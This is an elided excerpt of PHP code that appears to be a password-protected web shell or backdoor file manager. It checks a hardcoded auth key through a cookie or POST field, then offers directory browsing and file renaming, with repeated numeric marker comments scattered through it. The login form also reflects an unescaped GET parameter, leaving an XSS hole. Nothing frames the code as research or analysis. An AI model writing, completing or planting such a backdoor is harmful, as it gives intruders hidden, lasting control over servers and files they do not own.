...
$auth_key = "21037fbf5f18a2a358cbf118744ba20a";
...
$pass = false;
if (isset($_COOKIE['pw_name_53405'])) {
    if(($_COOKIE['pw_name_53405']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_53405'])) {
        if(($_POST['pw_name_53405']) == $auth_key) {
            setcookie("pw_name_53405", $_POST['pw_name_53405']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_53405' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1723565342402927 1723565342994974 1723565342605177 1723565342149374
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1723565342402927 1723565342994974 1723565342605177 1723565342149374
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1723565342402927 1723565342994974 1723565342605177 1723565342149374
            $name = PATH . "/" . $_GET['r'];
